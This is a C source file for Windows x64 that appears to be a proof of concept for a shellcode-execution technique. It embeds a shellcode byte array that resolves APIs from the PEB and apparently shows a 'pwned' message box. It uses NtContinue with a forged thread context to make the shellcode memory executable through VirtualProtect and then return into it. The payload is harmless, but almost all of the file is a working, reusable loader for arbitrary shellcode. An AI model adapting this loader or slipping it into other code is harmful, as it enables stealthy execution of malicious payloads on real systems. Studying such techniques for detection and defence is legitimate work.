#include <Windows.h>
#include <stdio.h>
#include <stdint.h>

/*

EXE works with WinExec and VirtualProtect on 8.1 and 10.
Does not throw the invalid param error observed in iexplore.exe.

*/
typedef NTSTATUS(NTAPI* NtContinue_t)(CONTEXT *);

uint8_t Shellcode[] =
"\x48\x83\xec\x08\x40\x80\xe4\xf7\x48\xc7\xc1\x88\x4e\x0d\x00\xe8"
"\x91\x00\x00\x00\x48\x89\xc7\x48\xc7\xc2\x86\x57\x0d\x00\x48\x89"
"\xf9\xe8\xde\x00\x00\x00\x48\xb9\x75\x73\x65\x72\x33\x32\x00\x00"
"\x51\x48\x89\xe1\x55\x48\x89\xe5\x48\x83\xec\x20\x48\x83\xec\x08"
"\x40\x80\xe4\xf7\xff\xd0\x48\x89\xec\x5d\x48\xc7\xc2\x1a\xb8\x06"
"\x00\x48\x89\xc1\xe8\xab\x00\x00\x00\x4d\x31\xc9\x48\xb9\x70\x77"
"\x6e\x65\x64\x00\x00\x00\x51\x49\x89\xe0\x48\xc7\xc1\x6e\x65\x74"
"\x00\x51\x48\xb9\x65\x73\x74\x2d\x6f\x72\x72\x2e\x51\x48\xb9\x77"
"\x77\x77\x2e\x66\x6f\x72\x72\x51\x48\x89\xe2\x48\x31\xc9\x55\x48"
"\x89\xe5\x48\x83\xec\x20\x48\x83\xec\x08\x40\x80\xe4\xf7\xff\xd0"
"\x48\x89\xec\x5d\xc3\x41\x50\x57\x56\x49\x89\xc8\x48\xc7\xc6\x60"
"\x00\x00\x00\x65\x48\xad\x48\x8b\x40\x18\x48\x8b\x78\x30\x48\x89"
"\xfe\x48\x31\xc0\xeb\x05\x48\x39\xf7\x74\x34\x48\x85\xf6\x74\x2f"
"\x48\x8d\x5e\x38\x48\x85\xdb\x74\x1a\x48\xc7\xc2\x01\x00\x00\x00"
"\x48\x8b\x4b\x08\x48\x85\xc9\x74\x0a\xe8\xa7\x01\x00\x00\x4c\x39"
"\xc0\x74\x08\x48\x31\xc0\x48\x8b\x36\xeb\xcb\x48\x8b\x46\x10\x5e"
"\x5f\x41\x58\xc3\x55\x48\x89\xe5\x48\x81\xec\x50\x02\x00\x00\x57"
"\x56\x48\x89\x4d\xf8\x48\x89\x55\xf0\x48\x31\xdb\x8b\x59\x3c\x48"
"\x01\xd9\x48\x83\xc1\x18\x48\x8b\x75\xf8\x48\x31\xdb\x8b\x59\x70"
"\x48\x01\xde\x48\x89\x75\xe8\x8b\x41\x74\x89\x45\xc0\x48\x8b\x45"
"\xf8\x8b\x5e\x20\x48\x01\xd8\x48\x89\x45\xe0\x48\x8b\x45\xf8\x48"
"\x31\xdb\x8b\x5e\x24\x48\x01\xd8\x48\x89\x45\xd8\x48\x8b\x45\xf8"
"\x8b\x5e\x1c\x48\x01\xd8\x48\x89\x45\xd0\x48\x31\xf6\x48\x89\x75"
"\xc8\x48\x8b\x45\xe8\x8b\x40\x18\x48\x39\xf0\x0f\x86\x09\x01\x00"
"\x00\x48\x89\xf0\x48\x8d\x0c\x85\x00\x00\x00\x00\x48\x8b\x55\xe0"
"\x48\x8b\x45\xf8\x8b\x1c\x11\x48\x01\xd8\x48\x31\xd2\x48\x89\xc1"
"\xe8\xf0\x00\x00\x00\x3b\x45\xf0\x0f\x85\xd3\x00\x00\x00\x48\x89"
"\xf0\x48\x8d\x14\x00\x48\x8b\x45\xd8\x48\x0f\xb7\x04\x02\x48\x8d"
"\x0c\x85\x00\x00\x00\x00\x48\x8b\x55\xd0\x48\x8b\x45\xf8\x8b\x1c"
"\x11\x48\x01\xd8\x48\x89\x45\xc8\x48\x8b\x4d\xe8\x48\x89\xca\x48"
"\x31\xdb\x8b\x5d\xc0\x48\x01\xda\x48\x39\xc8\x0f\x8c\x99\x00\x00"
"\x00\x48\x39\xd0\x0f\x8d\x90\x00\x00\x00\x48\xc7\x45\xc8\x00\x00"
"\x00\x00\x48\x31\xc9\x90\x48\x8d\x9d\xb0\xfd\xff\xff\x8a\x14\x08"
"\x80\xfa\x00\x74\x28\x80\xfa\x2e\x75\x19\xc7\x03\x2e\x64\x6c\x6c"
"\x48\x83\xc3\x04\xc6\x03\x00\x48\x8d\x9d\xb0\xfe\xff\xff\x48\xff"
"\xc1\xeb\xda\x88\x13\x48\xff\xc1\x48\xff\xc3\xeb\xd0\xc6\x03\x00"
"\x48\x31\xd2\x48\x8d\x8d\xb0\xfd\xff\xff\xe8\x46\x00\x00\x00\x48"
"\x89\xc1\xe8\x4e\xfe\xff\xff\x48\x85\xc0\x74\x2e\x48\x89\x45\xb8"
"\x48\x31\xd2\x48\x8d\x8d\xb0\xfe\xff\xff\xe8\x26\x00\x00\x00\x48"
"\x89\xc2\x48\x8b\x4d\xb8\xe8\x89\xfe\xff\xff\x48\x89\x45\xc8\xeb"
"\x09\x48\xff\xc6\x90\xe9\xe7\xfe\xff\xff\x48\x8b\x45\xc8\x5e\x5f"
"\x48\x89\xec\x5d\xc3\x57\x48\x89\xd7\x48\x31\xdb\x80\x39\x00\x74"
"\x1a\x0f\xb6\x01\x0c\x60\x0f\xb6\xd0\x01\xd3\x48\xd1\xe3\x48\xff"
"\xc1\x48\x85\xff\x74\xe6\x48\xff\xc1\xeb\xe1\x48\x89\xd8\x5f\xc3";

int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
	NtContinue_t NtContinue = (NtContinue_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtContinue");
	printf("... successfully resolved NtContinue to 0x%p\r\n", NtContinue);
	CONTEXT NewCtx = { 0 };
	uint32_t dwOldProtect = 0;
	NewCtx.ContextFlags = CONTEXT_ALL;

	if (GetThreadContext(GetCurrentThread(), &NewCtx)) {
		printf("... current RCX: 0x%p\r\n", NewCtx.Rcx);
		printf("... current RSP: 0x%p\r\n", NewCtx.Rsp);
		//uint8_t* pArtificialStack = (uint8_t *)VirtualAlloc(nullptr, 0x10000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
		uint8_t* pArtificialStack = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x10000);
		printf("... artificial stack alloc base: 0x%p\r\n", pArtificialStack);
		uint8_t *pShellcodeBuf = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x10000);
		while ((uint64_t)pShellcodeBuf % 0x1000 != 0) pShellcodeBuf++;
		memcpy(pShellcodeBuf, Shellcode, sizeof(Shellcode));
		//pShellcodeBuf = Shellcode;
		pArtificialStack += 0x4000; // Using 0x2000 broke it when ran as an EXE but not in a debugger. Using VirtualAlloc worked presumably because when it went OOB the mem was still valid.
		pArtificialStack += 8;
		*(uint64_t*)&pArtificialStack[0] = (DWORD64)pShellcodeBuf;
		//*(uint64_t*)&pArtificialStack[-8] = (DWORD64)pShellcodeBuf;
		//*(uint64_t*)&pArtificialStack[8] = (DWORD64)pShellcodeBuf;
		//*(uint64_t*)&pArtificialStack[-16] = (DWORD64)pShellcodeBuf;
		//*(uint64_t*)&pArtificialStack[16] = (DWORD64)pShellcodeBuf;

		/*
		pArtificialStack = (uint8_t *)NewCtx.Rsp;
		pArtificialStack -= 0x1000; // Needed when original stack is used otherwise it will be contaminated leading up to the NtContinue call
		*(uint64_t*)&pArtificialStack[0] = (DWORD64)pShellcodeBuf;
		*/

		printf("... new RSP: 0x%p\r\n", pArtificialStack);

		/*
		NewCtx.Rcx = (DWORD64)"notepad.exe";
		NewCtx.Rdx = SW_SHOW;
		NewCtx.Rip = (DWORD64)WinExec;
		*/

		printf("... shellcode in .data: 0x%p, shellcode on heap: 0x%p\r\n", Shellcode, pShellcodeBuf);
		NewCtx.Rcx = (DWORD64)pShellcodeBuf;
		NewCtx.Rdx = sizeof(Shellcode);
		NewCtx.R8 = PAGE_EXECUTE_READWRITE;
		NewCtx.R9 = (DWORD64)&dwOldProtect;
		NewCtx.Rip = (DWORD64)VirtualProtect;

		NewCtx.Rsp = (DWORD64)pArtificialStack;
		//NewCtx.Rsp -= 0x8;
		NewCtx.ContextFlags = CONTEXT_ALL;
		NTSTATUS NtStatus = NtContinue(&NewCtx);
		printf("... NtStatus from NtContinue: 0x%08x\r\n", NtStatus);
	}

	return 0;
}